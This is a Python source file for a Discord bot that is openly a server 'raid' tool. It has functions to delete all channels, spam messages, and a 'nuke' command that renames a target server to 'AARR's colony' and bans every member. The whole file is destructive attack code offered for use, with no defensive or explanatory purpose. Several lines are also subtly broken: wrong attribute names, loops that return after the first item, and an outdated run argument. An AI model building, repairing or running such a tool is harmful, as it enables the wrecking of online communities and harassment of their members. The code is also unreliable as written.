import discord
from discord.ext import commands
import threading
import random



intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix="n!",intents=intents)


async def deletechannel(guild: discord.Guild):
  for i in guild.channel:
    try:
      await i.delete(reason="raid")
      return True
    except Exception:
      pass
  else:
    return "Finish"


async def spam(String, Guild: discord.Guild, ChannelID=None):
  if ChannelID is None:
    for i in Guild.text_channel:
      try:
        await i.send(String)
        return True
      except Exception:
        pass
    else:
      return "Finish"
    
  elif ChannelID is not None:
    try:
      spamch = client.get_channel(ChannelID)
      await spamch.send(String)
    except:
      pass
  else:
    return False



@client.command()
async def nuke(ctx, guild: discord.Guild):
  await guild.edit(name="AARRの植民地")
  for user in guild.members:
    try:
      await guild.ban(user, reason="raid")
    except:
      print("banできなかった")
  await ctx.reply(f"raid完了!")


client.run("TOKEN",bot=True)
